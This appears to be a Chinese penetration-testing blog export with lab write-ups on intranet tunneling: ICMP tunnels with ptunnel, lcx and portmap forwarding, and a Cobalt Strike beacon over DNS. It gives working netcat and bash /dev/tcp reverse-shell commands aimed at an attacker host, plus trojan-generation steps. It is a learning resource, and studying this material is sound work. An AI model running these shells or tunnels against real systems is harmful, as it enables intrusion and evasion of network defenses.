class="built_in">print</span>(<span class="string">&#x27;---&gt;&#x27;</span>+exec1+<span class="string">&#x27;&lt;---&#x27;</span>)</span><br><span class="line">            </span><br><span class="line">            os.system(<span class="built_in">exec</span>)</span><br><span class="line">            os.system(exec1)</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>







<h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><p>PsTools：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools">https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools</a></p>
<p>mimikatz：<a href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a></p>
<p>impacket-examples-windows：<a href="https://gitee.com/RichChigga/impacket-examples-windows">https://gitee.com/RichChigga/impacket-examples-windows</a></p>
]]></content>
      <categories>
        <category>内网安全</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>内网安全</tag>
      </tags>
  </entry>
  <entry>
    <title>域横向网络&amp;传输&amp;应用层隧道技术</title>
    <url>/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&amp;%E4%BC%A0%E8%BE%93&amp;%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/</url>
    <content><![CDATA[<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20220314130404064.png" alt="image-20220314130404064"></p>
<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h3 id="隧道"><a href="#隧道" class="headerlink" title="隧道"></a>隧道</h3><p>在实际的网络中，通常会通过各种边界设备、软/硬件防火墙甚至入侵检测系统来检查对外连接情况，如果发现异样，就会对通信进行阻断。那么什么是隧道呢？这里的隧道，就是一种绕过端口屏蔽的通信方式。防火墙两端的数据包通过防火墙所允许的数据包类型或端口进行封装，然后穿过防火墙，与对方进行通信。当封装的数据包到达目的地时，将数据包还原，并将还原后的数据包发送到相应服务器上。</p>
<h3 id="代理和隧道技术的区别"><a href="#代理和隧道技术的区别" class="headerlink" title="代理和隧道技术的区别"></a>代理和隧道技术的区别</h3><p>代理主要解决网络访问通讯问题（从一个内网到另一个内网）</p>
<p>隧道技术解决在代理基础之上通讯受阻的问题（被防火墙等检测拦截），达到绕过过滤限制等</p>
<h3 id="隧道技术解决什么"><a href="#隧道技术解决什么" class="headerlink" title="隧道技术解决什么"></a>隧道技术解决什么</h3><p>用单独的通道来传输被拦截的数据</p>
<p>CS、MSF无法上线，数据传输不稳定无回显，出口数据被监控，网络通信存在问题等</p>
<h3 id="常见的隧道技术"><a href="#常见的隧道技术" class="headerlink" title="常见的隧道技术"></a>常见的隧道技术</h3><p>网络层：IPv6隧道、ICMP隧道</p>
<p>传输层：TCP隧道、UDP隧道、常规端口转发</p>
<p>应用层：SSH隧道、HTTP/S隧道、DNS隧道</p>
<h2 id="网络传输应用层检测连通性-检测"><a href="#网络传输应用层检测连通性-检测" class="headerlink" title="网络传输应用层检测连通性-检测"></a>网络传输应用层检测连通性-检测</h2><h3 id="1-TCP协议"><a href="#1-TCP协议" class="headerlink" title="1.TCP协议"></a>1.TCP协议</h3><p>用“瑞士军刀”netcat，执行nc命令：</p>
<pre><code>nc &lt;IP&gt; &lt;端口&gt;
</code></pre>
<h3 id="2-HTTP协议"><a href="#2-HTTP协议" class="headerlink" title="2.HTTP协议"></a>2.HTTP协议</h3><p>用curl工具，执行：</p>
<pre><code>curl &lt;IP地址:端口&gt;
</code></pre>
<p>如果远程主机开启了相应的端口，且内网可连接外网的话，就会输出相应的端口信息</p>
<h3 id="3-ICMP协议"><a href="#3-ICMP协议" class="headerlink" title="3.ICMP协议"></a>3.ICMP协议</h3><p>用ping命令，执行：</p>
<pre><code>ping &lt;IP地址/域名&gt;
</code></pre>
<h3 id="4-DNS协议"><a href="#4-DNS协议" class="headerlink" title="4.DNS协议"></a>4.DNS协议</h3><p>检测DNS连通性常用的命令是nslookup和dig</p>
<p>nslookup是windows自带的DNS探测命令</p>
<p>dig是linux系统自带的DNS探测命令</p>
<h2 id="网络ICMP隧道Ptunnel使用-检测，利用"><a href="#网络ICMP隧道Ptunnel使用-检测，利用" class="headerlink" title="网络ICMP隧道Ptunnel使用-检测，利用"></a>网络ICMP隧道Ptunnel使用-检测，利用</h2><p>ptunnel把tcp/udp/sock5流量伪装成icmp流量进行转发</p>
<figure class="highlight haml"><table><tr><td class="code"><pre><span class="line">-<span class="ruby">p <span class="comment">##表示链接icmp隧道另一端的机器IP（目标服务器）</span></span></span><br><span class="line"><span class="ruby"></span>-<span class="ruby">lp     表示需要监听的本地tcp端口</span></span><br><span class="line"><span class="ruby"></span></span><br><span class="line">-<span class="ruby">da <span class="comment">##指定需要转发的机器的IP（即目标内网某一机器的内网IP）</span></span></span><br><span class="line"><span class="ruby"></span></span><br><span class="line">-<span class="ruby">dp <span class="comment">##指定需要转发的机器的端口（即目标内网某一机器的内网端口）</span></span></span><br><span class="line"><span class="ruby"></span></span><br><span class="line">-<span class="ruby">x <span class="comment">##设置连接的密码</span></span></span><br></pre></td></tr></table></figure>

<h3 id="ptunnel安装"><a href="#ptunnel安装" class="headerlink" title="ptunnel安装"></a>ptunnel安装</h3><p><a href="https://www.cnblogs.com/autopwn/p/14642658.html">https://www.cnblogs.com/autopwn/p/14642658.html</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Centos7下的安装步骤</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">安装libpcap的依赖环境</span></span><br><span class="line">yum -y install byacc</span><br><span class="line">yum -y install flex bison</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">安装libpcap依赖库</span></span><br><span class="line">wget http://www.tcpdump.org/release/libpcap-1.9.0.tar.gz</span><br><span class="line">tar -xzvf libpcap-1.9.0.tar.gz</span><br><span class="line">cd libpcap-1.9.0</span><br><span class="line">./configure</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">安装PingTunnel</span></span><br><span class="line">wget http://www.cs.uit.no/~daniels/PingTunnel/PingTunnel-0.72.tar.gz</span><br><span class="line">tar -xzvf PingTunnel-0.72.tar.gz</span><br><span class="line">cd PingTunnel</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">安装完成之后直接可以执行命令</span><br></pre></td></tr></table></figure>

<h3 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h3><h4 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h4><p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20220316001809150.png" alt="image-20220316001809150"></p>
<p>攻击机kali：192.168.184.128</p>
<p>中介机webserver：192.168.184.142(可出网)   192.168.22.128(内网)</p>
<p>目标机DC(windows)：192.168.22.130(内网)</p>
<h4 id="打靶"><a href="#打靶" class="headerlink" title="打靶"></a>打靶</h4><p>中介机开启隧道，密码为123</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ptunnel</span> -x <span class="number">123</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20220322130944392.png" alt="image-20220322130944392"></p>
<p>攻击机连接隧道</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ptunnel</span> -p <span class="number">192.168.184.142</span> -lp <span class="number">2333</span> -da <span class="number">192.168.22.130</span> -dp <span class="number">3389</span> -x <span class="number">123</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20220322131219962.png" alt="image-20220322131219962"></p>
<p>当192.168.184.142（p）收到来自192.168.22.130（da）的3389端口（dp）的数据时，发送到攻击机的1080端口（lp）。反之亦然（在二者之间建立隧道）</p>
<p>攻击机(kali)使用<code>rdesktop</code>进行远程连接</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">rdesktop</span> <span class="number">127.0.0.1</span> <span class="number">2333</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20220322131505617.png" alt="image-20220322131505617"></p>
<p>输入用户名密码登录成功</p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20220322131717154.png" alt="image-20220322131717154"></p>
<h2 id="传输层转发隧道lcx、Portmap使用-检测利用"><a href="#传输层转发隧道lcx、Portmap使用-检测利用" class="headerlink" title="传输层转发隧道lcx、Portmap使用-检测利用"></a>传输层转发隧道lcx、Portmap使用-检测利用</h2><p>Windows：lcx</p>
<p>Linux：portmap</p>
<h4 id="windows演示"><a href="#windows演示" class="headerlink" title="windows演示"></a>windows演示</h4><h5 id="在被攻击机上："><a href="#在被攻击机上：" class="headerlink" title="在被攻击机上："></a>在被攻击机上：</h5><pre><code>lcx -slave 跳板机IP 6666 127.0.0.1 3389
</code></pre>
<p>将（被攻击机）本地的3389转发到跳板机的6666端口</p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20220323090734071.png" alt="image-20220323090734071"></p>
<h5 id="在跳板机上（这里需要在跳板机监听才能接收到数据）："><a href="#在跳板机上（这里需要在跳板机监听才能接收到数据）：" class="headerlink" title="在跳板机上（这里需要在跳板机监听才能接收到数据）："></a>在跳板机上（<strong>这里需要在跳板机监听才能接收到数据</strong>）：</h5><pre><code>lcx -listen 本机端口 映射端口

lcx -listen 6666 7777
</code></pre>
<p>监听6666映射到7777</p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20220323090627017.png" alt="image-20220323090627017"></p>
<h5 id="在攻击机上（进行远程连接）："><a href="#在攻击机上（进行远程连接）：" class="headerlink" title="在攻击机上（进行远程连接）："></a>在攻击机上（进行远程连接）：</h5><pre><code>rdesktop 跳板机IP:7777
</code></pre>
<h2 id="传输层转发隧道Netcat使用-检测，利用，功能"><a href="#传输层转发隧道Netcat使用-检测，利用，功能" class="headerlink" title="传输层转发隧道Netcat使用-检测，利用，功能"></a>传输层转发隧道Netcat使用-检测，利用，功能</h2><h3 id="1-双向连接反弹shell"><a href="#1-双向连接反弹shell" class="headerlink" title="1.双向连接反弹shell"></a>1.双向连接反弹shell</h3><h4 id="正向：攻击连接受害"><a href="#正向：攻击连接受害" class="headerlink" title="正向：攻击连接受害"></a>正向：攻击连接受害</h4><p><strong>受害：</strong></p>
<pre><code>nc -ldp 1234 -e /bin/sh                                          //linux

nc -ldp 1234 -e c:\windows\system32\cmd.exe    //windows
</code></pre>
<p>将命令行界面（shell/cmd）推到1234端</p>
<p><strong>攻击：</strong></p>
<pre><code>nc 受害机IP 1234                                          //主动连接
</code></pre>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20220323120426682.png" alt="image-20220323120426682"></p>
<h4 id="反向：受害连接攻击"><a href="#反向：受害连接攻击" class="headerlink" title="反向：受害连接攻击"></a>反向：受害连接攻击</h4><p><strong>攻击：</strong></p>
<p>监听自己的1234端口</p>
<pre><code>nc -lvp 1234
</code></pre>
<p><strong>受害：</strong></p>
<pre><code>nc 攻击机IP 1234 -e /bin/sh

nc 攻击机IP 1234 -e c:\windows\system32\cmd.exe
</code></pre>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20220323120156763.png" alt="image-20220323120156763"></p>
<h3 id="2-多向连接反弹shell-配合转发-反向-portmap"><a href="#2-多向连接反弹shell-配合转发-反向-portmap" class="headerlink" title="2.多向连接反弹shell-配合转发-反向-portmap"></a>2.多向连接反弹shell-配合转发-<strong>反向</strong>-<strong>portmap</strong></h3><blockquote>
<p>Target2服务器将自己的cmd反弹到Target1的666端口，Target1使用portmap将本地666端口映射到本地777端口，最后由kali(攻击机)连接Target1的777端口</p>
</blockquote>
<h4 id="Target2-Ubuntu"><a href="#Target2-Ubuntu" class="headerlink" title="Target2_Ubuntu"></a>Target2_Ubuntu</h4><pre><code>bash -i &gt;&amp; /dev/tcp/192.168.22.128/6666 &lt;&amp;1
</code></pre>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20220327190611981.png" alt="image-20220327190611981"></p>
<h4 id="Target1-CentOS"><a href="#Target1-CentOS" class="headerlink" title="Target1_CentOS"></a>Target1_CentOS</h4><p>把666端口数据转发到777端口</p>
<pre><code>./portmap -m 1 -p1 6666 -h2 192.168.184.128 -p2 7777
</code></pre>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20220327190552222.png" alt="image-20220327190552222"></p>
<h4 id="kali"><a href="#kali" class="headerlink" title="kali"></a>kali</h4><pre><code>nc -lvvp 7777
</code></pre>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20220327190529559.png" alt="image-20220327190529559"></p>
<h4 id="portmap使用"><a href="#portmap使用" class="headerlink" title="portmap使用"></a>portmap使用</h4><figure class="highlight oxygene"><table><tr><td class="code"><pre><span class="line">Usage:./portmap -m <span class="function"><span class="keyword">method</span> [-<span class="title">h1</span> <span class="title">host1</span>] -<span class="title">p1</span> <span class="title">port1</span> [-<span class="title">h2</span> <span class="title">host2</span>] -<span class="title">p2</span> <span class="title">port2</span> [-<span class="title">v</span>] [-<span class="title">log</span> <span class="title">filename</span>]</span></span><br><span class="line"><span class="function"> -<span class="title">v</span>:</span> version</span><br><span class="line"> -h1: host1</span><br><span class="line"> -h2: host2</span><br><span class="line"> -p1: port1</span><br><span class="line"> -p2: port2</span><br><span class="line"> -log: log the data</span><br><span class="line"> -m: the action <span class="function"><span class="keyword">method</span> <span class="title">for</span> <span class="title">this</span> <span class="title">tool</span></span></span><br><span class="line"><span class="function"> 1:</span> listen <span class="keyword">on</span> PORT1 <span class="keyword">and</span> connect <span class="keyword">to</span> HOST2:PORT2</span><br><span class="line"> <span class="number">2</span>: listen <span class="keyword">on</span> PORT1 <span class="keyword">and</span> PORT2</span><br><span class="line"> <span class="number">3</span>: connect <span class="keyword">to</span> HOST1:PORT1 <span class="keyword">and</span> HOST2:PORT2</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/LTtiandd/article/details/102903725">https://blog.csdn.net/LTtiandd/article/details/102903725</a></p>
<h3 id="3-相关netcat主要功能"><a href="#3-相关netcat主要功能" class="headerlink" title="3.相关netcat主要功能"></a>3.相关netcat主要功能</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 指纹服务</span></span><br><span class="line">nc -nv 192.168.184.142:xxxx</span><br><span class="line"></span><br><span class="line"><span class="comment"># 端口扫描</span></span><br><span class="line">nc -v -z 192.168.184.142 1-100</span><br><span class="line"></span><br><span class="line"><span class="comment"># 端口监听</span></span><br><span class="line">nc -lvp xxxx</span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件传输</span></span><br><span class="line">nc -lp 1111 &gt;1.txt|nc -vn xx.xx.x.x 1111 &lt;1.txt -q 1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 反弹Shell（见上）</span></span><br></pre></td></tr></table></figure>

<h2 id="应用层DNS隧道配合CS上线-检测，利用，说明"><a href="#应用层DNS隧道配合CS上线-检测，利用，说明" class="headerlink" title="应用层DNS隧道配合CS上线-检测，利用，说明"></a>应用层DNS隧道配合CS上线-检测，利用，说明</h2><blockquote>
<p>当常见协议监听器被拦截时，可以换其他协议上线，其中dns协议上线基本通杀</p>
</blockquote>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/listener-infrastructue_beacon-dns.htm#_Toc65482740">https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/listener-infrastructue_beacon-dns.htm#_Toc65482740</a></p>
<p><a href="https://www.secpulse.com/archives/124454.html">Cobalt Strike｜Beacon原理浅析</a></p>
<p><a href="https://www.cnblogs.com/EndlessShw/p/15521355.html">Cobalt Strike DNS Beacon 的使用和原理</a></p>
<h4 id="什么是Beacon"><a href="#什么是Beacon" class="headerlink" title="什么是Beacon"></a>什么是Beacon</h4><p><strong>Beacon是Cobalt Strike运行在目标主机上的payload</strong>，Beacon在隐蔽信道上我们提供服务，用于长期控制受感染主机。它的工作方式与Metasploit Framework Payload类似。在实际渗透过程中，我<strong>们可以将其嵌入到可执行文件、添加到Word文档或者通过利用主机漏洞来传递Beacon</strong>。</p>
<p>Beacon的功能包括以下几点：</p>
<ol>
<li><p>使用HTTP或DNS检查是否有待执行任务</p>
</li>
<li><p>可连接到多个C2域名</p>
</li>
<li><p>能够在分段传输后自动迁移</p>
</li>
<li><p>与Cobalt Strike紧密集成，通过社工、主机漏洞和会话来传递Beacon</p>
</li>
</ol>
<p>Beacon的中文名为信标，像是在网络中告诉我们：“嘿，我是肉鸡，我在这…”。我们可以通过下图来看<strong>Beacon的工作原理</strong>：</p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20220328155752894.png" alt="image-20220328155752894"></p>
<h4 id="DNS-Beacon-的工作过程"><a href="#DNS-Beacon-的工作过程" class="headerlink" title="DNS Beacon 的工作过程"></a>DNS Beacon 的工作过程</h4><p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20220328155601467.png" alt="image-20220328155601467"></p>
<p>当受害者请求域名对应的ip地址时（通过 shell 或者 钓鱼），会从根域名DNS服务器，一级域名DNS服务器，二级域名DNS服务器…依次向下寻找，直到我们的团队服务器，同时充当DNS服务器，将Beacon返回给团队服务器。DNS响应告诉Beacon休眠或者连接到团队服务器来下载任务。<strong>DNS响应同时也告诉Beacon如何从团队服务器下载任务</strong>。</p>
<h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><h4 id="配置监听器"><a href="#配置监听器" class="headerlink" title="配置监听器"></a>配置监听器</h4><blockquote>
<p>需要买一个域名修改解析记录如下：</p>
<p>记录类型-&gt;主机记录-&gt;记录值</p>
<p>A记录-&gt;cs主机名-&gt;CS服务器IP</p>
<p>NS记录-&gt;ns1主机名-&gt;A记录地址</p>
<p>NS记录-&gt;ns2主机名-&gt;A记录地址</p>
</blockquote>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20220328220713776.png" alt="image-20220328220713776"></p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20220327223518224.png" alt="image-20220327223518224"></p>
<p>这里遇到了坑，创建不了监听器</p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/FWJ7%7D6NY36CFOIL2F5KJM.png" alt="img"></p>
<p>一直说地址被占用，搞了好久，发现是我VPS的53端口被占用了，关掉就好了</p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20220328125213095.png" alt="image-20220328125213095"></p>
<p>很奇怪的是，我和赵师傅都有这个进程，他就能创，我却不能，就很玄学。问了黄师傅说是有些服务有关联性，有的服务运行有优先级啥的，也说不准，只能说盲猜QAQ</p>
<h4 id="生成木马"><a href="#生成木马" class="headerlink" title="生成木马"></a>生成木马</h4><blockquote>
<p>Windows Executable 　　　　　生成32位或64位的exe和基于服务的exe、DLL等后门程序</p>
<p>Windows Executable(S)　　　　用于生成一个exe可执行文件，其中包含Beacon的完整payload，不需要阶段性的请求。与Windows Executable模块相比，该模块额外提供了代理设置，以便在较为苛刻的环境中进行渗透测试。该模块还支持powershell脚本，可用于将Stageless Payload注入内存</p>
</blockquote>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20220328143931880.png" alt="image-20220328143931880"></p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20220328143953671.png" alt="image-20220328143953671"></p>
<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>当受害者主机运行我们的木马后，便会有一个<strong>unknown</strong>主机上线</p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20220328144156493.png" alt="image-20220328144156493"></p>
<p>interact进去后，输入如下命令进行配置</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">beacon&gt; checkin</span><br><span class="line"><span class="selector-attr">[*]</span> Tasked beacon <span class="selector-tag">to</span> checkin</span><br><span class="line">beacon&gt; mode dns-txt</span><br><span class="line"><span class="selector-attr">[+]</span> data channel set <span class="selector-tag">to</span> DNS-TXT</span><br><span class="line"><span class="selector-attr">[+]</span> host called home, sent: <span class="number">8</span> bytes</span><br></pre></td></tr></table></figure>

<p>出现如下图的样子，就说明受害主机真正成功上线</p>
<p>接下来就可以执行命令了</p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20220328145736619.png" alt="image-20220328145736619"></p>
<p>这里还遇到另外一个坑，就是当时弄的时候用的学校的网络，导致输入命令没有回显，换了手机热点就行了，真的吐了🤮</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.csdn.net/weixin_28744573/article/details/116581837">关闭linux系统的53端口</a></p>
<p><a href="https://blog.csdn.net/qq_43645782/article/details/121416056">Linux systemd-resolve占用53端口的解决方法</a></p>
<h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><p><a href="http://www.vuln.cn/wp-content/uploads/2016/06/lcx_vuln.cn_.zip">portmap+lcx.exe下载</a></p>
]]></content>
      <categories>
        <category>内网安全</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>内网安全</tag>
      </tags>
  </entry>
  <entry>
    <title>域横向内网漫游Socks代理技术</title>
    <url>/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/</url>
    <content><![CDATA[<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/image-20220312170107367.png" alt="image-20220312170107367"></p>
<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h3 id="私有地址"><a href="#私有地址" class="headerlink" title="私有地址"></a>私有地址</h3><p>IPv4地址协议中预留了3个IP地址段，作为私有地址，供组织机构内部使用。当私有网络内的主机要与位于公网上的主机进行通讯时必须经过地址转换，将其私有地址转换为合法公网地址才能对外访问。</p>
<p>A类地址：10/8               10.0.0.0–10.255.255.255</p>
<p>B类地址：172.16/12        172.16.0.0–172.31.255.255</p>
<p>C类地址：192.168/16    192.168.0.0–192.168.255.255</p>
<h3 id="内网间通信"><a href="#内网间通信" class="headerlink" title="内网间通信"></a>内网间通信</h3><p>需要使用代理技术才能通信</p>
<h3 id="正向反向协议通信连接"><a href="#正向反向协议通信连接" class="headerlink" title="正向反向协议通信连接"></a>正向反向协议通信连接</h3><p>正向：控制端连到被控端</p>
<p>反向：被控端连到控制端</p>
<p>我们一般无法直接访问到内网地址，就需要内网中的主机自己出网找到我们的唯一公网地址</p>
<h3 id="内网穿透代理隧道技术"><a href="#内网穿透代理隧道技术" class="headerlink" title="内网穿透代理隧道技术"></a>内网穿透代理隧道技术</h3><p>代理：解决网络的连通性</p>
<p>隧道：应对流量监控工具和防火墙的过滤</p>
